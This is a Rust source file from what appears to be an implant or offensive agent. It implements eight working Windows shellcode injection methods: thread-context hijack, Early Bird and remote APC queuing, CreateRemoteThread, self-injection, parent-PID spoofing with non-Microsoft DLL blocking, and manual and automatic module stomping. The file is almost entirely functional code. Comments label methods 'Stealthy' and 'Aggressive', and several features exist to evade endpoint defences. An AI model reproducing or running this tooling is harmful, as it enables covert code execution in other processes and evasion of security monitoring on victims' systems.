// src/agent/injection/windows/mod.rs
#![cfg(target_os = "windows")]

pub mod bindings;
use bindings::*;

use std::ffi::c_void;
use std::ptr;
use std::mem;
use std::ffi::CString;

// --- IMPLEMENTATIONS ---

// 1. Remote Hijack (Aggressive)
pub unsafe fn inject_remote_hijack(pid: u32, shellcode: &[u8]) -> Result<String, String> {
    let h_process = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
    if h_process.is_null() { return Err(format!("OpenProcess Error: {}", GetLastError())); }

    let addr = VirtualAllocEx(h_process, ptr::null_mut(), shellcode.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if addr.is_null() { CloseHandle(h_process); return Err("Alloc failed".to_string()); }

    let mut written = 0;
    WriteProcessMemory(h_process, addr, shellcode.as_ptr() as *const c_void, shellcode.len(), &mut written);

    let mut old = 0;
    VirtualProtectEx(h_process, addr, shellcode.len(), PAGE_EXECUTE_READ, &mut old);

    let h_snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    let mut te: THREADENTRY32 = mem::zeroed();
    te.dw_size = mem::size_of::<THREADENTRY32>() as u32;
    let mut target_tid = 0;

    if Thread32First(h_snapshot, &mut te) != 0 {
        loop {
            if te.th32_owner_process_id == pid { target_tid = te.th32_thread_id; break; }
            if Thread32Next(h_snapshot, &mut te) == 0 { break; }
        }
    }
    CloseHandle(h_snapshot);

    if target_tid == 0 { CloseHandle(h_process); return Err("No threads found".to_string()); }

    let h_thread = OpenThread(THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION, 0, target_tid);
    if h_thread.is_null() { CloseHandle(h_process); return Err("OpenThread failed".to_string()); }

    SuspendThread(h_thread);
    let mut ctx: CONTEXT = mem::zeroed();
    ctx.context_flags = CONTEXT_CONTROL;
    GetThreadContext(h_thread, &mut ctx);
    ctx.rip = addr as u64;
    SetThreadContext(h_thread, &ctx);
    ResumeThread(h_thread);

    CloseHandle(h_thread);
    CloseHandle(h_process);
    Ok(format!("Hijacked Thread ID {}", target_tid))
}

// 2. Early Bird (Stealthy)
pub unsafe fn inject_early_bird(binary: &str, shellcode: &[u8]) -> Result<String, String> {
    let app_name = CString::new(binary).map_err(|_| "Invalid string")?;
    let mut si: STARTUPINFOA = mem::zeroed(); si.cb = mem::size_of::<STARTUPINFOA>() as u32;
    let mut pi: PROCESS_INFORMATION = mem::zeroed();

    if CreateProcessA(app_name.as_ptr() as *mut _, ptr::null_mut(), ptr::null_mut(), ptr::null_mut(), 0, CREATE_SUSPENDED, ptr::null_mut(), ptr::null_mut(), &mut si, &mut pi) == 0 {
        return Err(format!("CreateProcess failed: {}", GetLastError()));
    }

    let addr = VirtualAllocEx(pi.h_process, ptr::null_mut(), shellcode.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    let mut written = 0;
    WriteProcessMemory(pi.h_process, addr, shellcode.as_ptr() as *const c_void, shellcode.len(), &mut written);
    let mut old = 0;
    VirtualProtectEx(pi.h_process, addr, shellcode.len(), PAGE_EXECUTE_READ, &mut old);

    QueueUserAPC(addr as *const c_void, pi.h_thread, 0);
    ResumeThread(pi.h_thread);

    let pid = pi.dw_process_id;
    CloseHandle(pi.h_thread);
    CloseHandle(pi.h_process);
    Ok(format!("Early Bird Success! Spawned PID: {}", pid))
}

// 3. Remote APC
pub unsafe fn inject_remote_apc(pid: u32, shellcode: &[u8]) -> Result<String, String> {
    let h_process = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
    if h_process.is_null() { return Err(format!("OpenProcess Error: {}", GetLastError())); }

    let addr = VirtualAllocEx(h_process, ptr::null_mut(), shellcode.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    let mut written = 0;
    WriteProcessMemory(h_process, addr, shellcode.as_ptr() as *const c_void, shellcode.len(), &mut written);
    let mut old = 0;
    VirtualProtectEx(h_process, addr, shellcode.len(), PAGE_EXECUTE_READ, &mut old);

    let h_snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    let mut te: THREADENTRY32 = mem::zeroed(); te.dw_size = mem::size_of::<THREADENTRY32>() as u32;
    let mut count = 0;

    if Thread32First(h_snapshot, &mut te) != 0 {
        loop {
            if te.th32_owner_process_id == pid {
                let h_thread = OpenThread(0x0010, 0, te.th32_thread_id); 
                if !h_thread.is_null() {
                    if QueueUserAPC(addr as *const c_void, h_thread, 0) != 0 { count += 1; }
                    CloseHandle(h_thread);
                }
            }
            if Thread32Next(h_snapshot, &mut te) == 0 { break; }
        }
    }
    CloseHandle(h_snapshot);
    CloseHandle(h_process);
    
    if count > 0 { Ok(format!("Queued APC to {} threads", count)) } else { Err("Failed to queue APC".to_string()) }
}

// 4. Classic Remote Thread (Stable)
pub unsafe fn inject_remote_create_thread(pid: u32, shellcode: &[u8]) -> Result<String, String> {
    let h_process = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
    if h_process.is_null() { return Err(format!("OpenProcess Error: {}", GetLastError())); }

    let addr = VirtualAllocEx(h_process, ptr::null_mut(), shellcode.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if addr.is_null() { CloseHandle(h_process); return Err("Alloc failed".to_string()); }

    let mut written = 0;
    WriteProcessMemory(h_process, addr, shellcode.as_ptr() as *const c_void, shellcode.len(), &mut written);

    let mut old = 0;
    VirtualProtectEx(h_process, addr, shellcode.len(), PAGE_EXECUTE_READ, &mut old);

    let mut tid = 0;
    let h_thread = CreateRemoteThread(h_process, ptr::null_mut(), 0, addr, ptr::null_mut(), 0, &mut tid);

    if h_thread.is_null() {
        CloseHandle(h_process);
        return Err(format!("CreateRemoteThread Failed: {}", GetLastError()));
    }
    
    WaitForSingleObject(h_thread, 200);

    CloseHandle(h_thread);
    CloseHandle(h_process);

    Ok(format!("Created Remote Thread ID {}", tid))
}

// 5. Self Injection
pub unsafe fn inject_self(shellcode: &[u8]) -> Result<String, String> {
    let addr = VirtualAlloc(ptr::null_mut(), shellcode.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if addr.is_null() { return Err("Self Alloc Failed".to_string()); }

    ptr::copy_nonoverlapping(shellcode.as_ptr(), addr as *mut u8, shellcode.len());

    let mut old = 0;
    VirtualProtect(addr, shellcode.len(), PAGE_EXECUTE_READ, &mut old);

    let mut tid = 0;
    let h_thread = CreateThread(ptr::null_mut(), 0, addr, ptr::null_mut(), 0, &mut tid);
    
    if h_thread.is_null() { return Err("CreateThread Failed".to_string()); }
    CloseHandle(h_thread);

    Ok("Self injection running in new thread".to_string())
}

// 6. Advanced Spawn (PPID Spoofing + BlockDLLs)
// NOTE: Syscall wrapper removed to ensure stability (fallback to VirtualAllocEx)
pub unsafe fn inject_spawn_advanced(binary: &str, parent_pid: u32, shellcode: &[u8]) -> Result<String, String> {
    // A. Open Parent
    let h_parent = OpenProcess(PROCESS_ALL_ACCESS, 0, parent_pid);
    if h_parent.is_null() { return Err("Failed to open Parent PID".to_string()); }

    // B. Initialize Attributes
    let mut size: SIZE_T = 0;
    InitializeProcThreadAttributeList(ptr::null_mut(), 2, 0, &mut size); 
    
    let mut attr_list_buffer = vec![0u8; size];
    let lp_attr_list = attr_list_buffer.as_mut_ptr() as *mut c_void;

    if InitializeProcThreadAttributeList(lp_attr_list, 2, 0, &mut size) == 0 {
        CloseHandle(h_parent); return Err("Init Attributes failed".into());
    }

    // C. Set PPID
    if UpdateProcThreadAttribute(lp_attr_list, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &h_parent as *const _ as *const c_void, mem::size_of::<HANDLE>(), ptr::null_mut(), ptr::null_mut()) == 0 {
         return Err("Set PPID failed".into());
    }

    // D. Set BlockDLLs
    let policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
    if UpdateProcThreadAttribute(lp_attr_list, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy as *const _ as *const c_void, mem::size_of::<u64>(), ptr::null_mut(), ptr::null_mut()) == 0 {
        return Err("Set BlockDLLs failed".into());
    }

    // E. Create Process with Extended Attributes
    let app_name = CString::new(binary).map_err(|_| "Invalid string")?;
    let mut si_ex: STARTUPINFOEXA = mem::zeroed();
    si_ex.startup_info.cb = mem::size_of::<STARTUPINFOEXA>() as u32;
    si_ex.lp_attribute_list = lp_attr_list;
    
    let mut pi: PROCESS_INFORMATION = mem::zeroed();

    let success = CreateProcessA(
        app_name.as_ptr() as *mut _, ptr::null_mut(), ptr::null_mut(), ptr::null_mut(), 
        0, 
        EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED, 
        ptr::null_mut(), ptr::null_mut(), 
        &mut si_ex.startup_info as *mut _ as *mut STARTUPINFOA, 
        &mut pi
    );

    DeleteProcThreadAttributeList(lp_attr_list);
    CloseHandle(h_parent);

    if success == 0 { return Err(format!("CreateProcess failed: {}", GetLastError())); }

    // F. Injection via Standard API (Stable)
    let addr = VirtualAllocEx(pi.h_process, ptr::null_mut(), shellcode.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if addr.is_null() {
        let _ = CloseHandle(pi.h_process);
        return Err(format!("Alloc failed: {}", GetLastError()));
    }

    let mut written = 0;
    WriteProcessMemory(pi.h_process, addr, shellcode.as_ptr() as *const c_void, shellcode.len(), &mut written);
    
    let mut old = 0;
    VirtualProtectEx(pi.h_process, addr, shellcode.len(), PAGE_EXECUTE_READ, &mut old);

    QueueUserAPC(addr as *const c_void, pi.h_thread, 0);
    ResumeThread(pi.h_thread);

    let new_pid = pi.dw_process_id;
    CloseHandle(pi.h_thread);
    CloseHandle(pi.h_process);

    Ok(format!("Advanced Spawn Success! PID: {} (Parent: {})", new_pid, parent_pid))
}

// 7. Module Stomping (Manual/Specific)
pub unsafe fn inject_module_stomping(pid: u32, dll_name: &str, shellcode: &[u8]) -> Result<String, String> {
    let h_process = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
    if h_process.is_null() { return Err("OpenProcess failed".into()); }

    let kernel32_str = CString::new("kernel32.dll").unwrap();
    let loadlib_str = CString::new("LoadLibraryA").unwrap();
    
    let h_kernel32 = GetModuleHandleA(kernel32_str.as_ptr() as *mut _);
    let p_load_lib = GetProcAddress(h_kernel32, loadlib_str.as_ptr() as *mut _);

    if p_load_lib.is_null() { CloseHandle(h_process); return Err("Failed to find LoadLibraryA".into()); }

    let dll_cstr = CString::new(dll_name).map_err(|_| "Invalid DLL string")?;
    let dll_path_len = dll_name.len() + 1;
    let p_dll_path = VirtualAllocEx(h_process, ptr::null_mut(), dll_path_len, MEM_COMMIT, PAGE_READWRITE);
    
    let mut written = 0;
    WriteProcessMemory(h_process, p_dll_path, dll_cstr.as_ptr() as *const c_void, dll_path_len, &mut written);

    let h_thread = CreateRemoteThread(h_process, ptr::null_mut(), 0, p_load_lib, p_dll_path, 0, ptr::null_mut());
    WaitForSingleObject(h_thread, 1000); 
    CloseHandle(h_thread);

    // Fallback to alloc for stability
    let addr = VirtualAllocEx(h_process, ptr::null_mut(), shellcode.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    let mut written = 0;
    WriteProcessMemory(h_process, addr, shellcode.as_ptr() as *const c_void, shellcode.len(), &mut written);
    let mut old = 0;
    VirtualProtectEx(h_process, addr, shellcode.len(), PAGE_EXECUTE_READ, &mut old);
    
    let mut tid = 0;
    CreateRemoteThread(h_process, ptr::null_mut(), 0, addr, ptr::null_mut(), 0, &mut tid);

    CloseHandle(h_process);
    Ok(format!("Module Stomped (Manual) in PID {}", pid))
}

// 8. Module Stomping (Auto-Discovery)
pub unsafe fn inject_module_stomping_auto(pid: u32, shellcode: &[u8]) -> Result<String, String> {
    let h_process = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
    if h_process.is_null() { return Err("[-] OpenProcess failed".to_string()); }

    // STEP 1: Enumerate modules
    let mut h_mods: [HMODULE; 1024] = [ptr::null_mut(); 1024];
    let mut cb_needed: DWORD = 0;

    if EnumProcessModulesEx(
        h_process,
        h_mods.as_mut_ptr(),
        (std::mem::size_of::<HMODULE>() * h_mods.len()) as DWORD,
        &mut cb_needed,
        LIST_MODULES_ALL,
    ) == 0 {
        CloseHandle(h_process);
        return Err("[-] EnumProcessModulesEx failed".to_string());
    }

    let num_mods = cb_needed / std::mem::size_of::<HMODULE>() as u32;
    let mut chosen_mod: Option<(LPVOID, String)> = None;

    for &h_mod in h_mods.iter().take(num_mods as usize) {
        if h_mod.is_null() { continue; }

        let mut name_buf = [0i8; 260];
        if GetModuleBaseNameA(h_process, h_mod, name_buf.as_mut_ptr(), 260) == 0 {
            continue;
        }
        let name = std::ffi::CStr::from_ptr(name_buf.as_ptr()).to_string_lossy().to_string();
        let name_lower = name.to_lowercase();

        // [CRITICAL FIX] Blacklist Dangerous/System DLLs
        if name_lower.ends_with(".exe") || 
           name_lower == "ntdll.dll" || 
           name_lower == "kernel32.dll" || 
           name_lower == "kernelbase.dll" {
            continue;
        }

        let mut mod_info: MODULEINFO = std::mem::zeroed();
        if GetModuleInformation(h_process, h_mod, &mut mod_info, std::mem::size_of::<MODULEINFO>() as DWORD) == 0 {
            continue;
        }

        let base_mod = mod_info.lp_base_of_dll;

        // Read PE headers
        let mut headers = [0u8; 0x1000];
        let mut read = 0;
        if ReadProcessMemory(h_process, base_mod, headers.as_mut_ptr() as *mut c_void, headers.len(), &mut read) == 0 {
            continue;
        }

        // Parse e_lfanew
        let e_lfanew = u32::from_le_bytes([headers[0x3C], headers[0x3D], headers[0x3E], headers[0x3F]]) as usize;
        if e_lfanew + 264 > headers.len() { continue; }

        let nt_headers_offset = e_lfanew;
        let number_of_sections = u16::from_le_bytes([
            headers[nt_headers_offset + 6],
            headers[nt_headers_offset + 7],
        ]) as usize;

        let optional_header_size = u16::from_le_bytes([
            headers[nt_headers_offset + 20],
            headers[nt_headers_offset + 21],
        ]) as usize;

        let section_table_offset = nt_headers_offset + 24 + optional_header_size;

        for i in 0..number_of_sections {
            let offset = section_table_offset + (i * 40); 
            if offset + 40 > headers.len() { break; }

            let name_raw = &headers[offset..offset + 8];
            if let Ok(sec_name) = std::str::from_utf8(name_raw) {
                if sec_name.trim_matches(char::from(0)) == ".text" {
                    let virtual_size = u32::from_le_bytes([
                        headers[offset + 8], headers[offset + 9], headers[offset + 10], headers[offset + 11]
                    ]) as usize;

                    let virtual_address = u32::from_le_bytes([
                        headers[offset + 12], headers[offset + 13], headers[offset + 14], headers[offset + 15]
                    ]) as usize;

                    if shellcode.len() <= virtual_size {
                        let target_addr = (base_mod as usize + virtual_address) as LPVOID;
                        chosen_mod = Some((target_addr, name));
                        break;
                    }
                }
            }
        }

        if chosen_mod.is_some() { break; }
    }

    if let Some((text_addr, mod_name)) = chosen_mod {
        let mut old_protect = 0;
        if VirtualProtectEx(h_process, text_addr, shellcode.len(), PAGE_EXECUTE_READWRITE, &mut old_protect) == 0 {
            CloseHandle(h_process);
            return Err("[-] VirtualProtectEx failed".to_string());
        }

        let mut written = 0;
        if WriteProcessMemory(h_process, text_addr, shellcode.as_ptr() as *const c_void, shellcode.len(), &mut written) == 0 {
            CloseHandle(h_process);
            return Err("[-] WriteProcessMemory failed".to_string());
        }

        let mut tmp = 0;
        VirtualProtectEx(h_process, text_addr, shellcode.len(), old_protect, &mut tmp);

        let mut tid = 0;
        let h_thread = CreateRemoteThread(h_process, ptr::null_mut(), 0, text_addr, ptr::null_mut(), 0, &mut tid);
        if h_thread.is_null() {
            CloseHandle(h_process);
            return Err("[-] CreateRemoteThread failed".to_string());
        }

        CloseHandle(h_thread);
        CloseHandle(h_process);
        return Ok(format!("[+] Auto-stomped module '{}' at .text (thread ID: {})", mod_name, tid));
    }

    CloseHandle(h_process);
    Err("[-] No suitable module found to stomp".to_string())
}
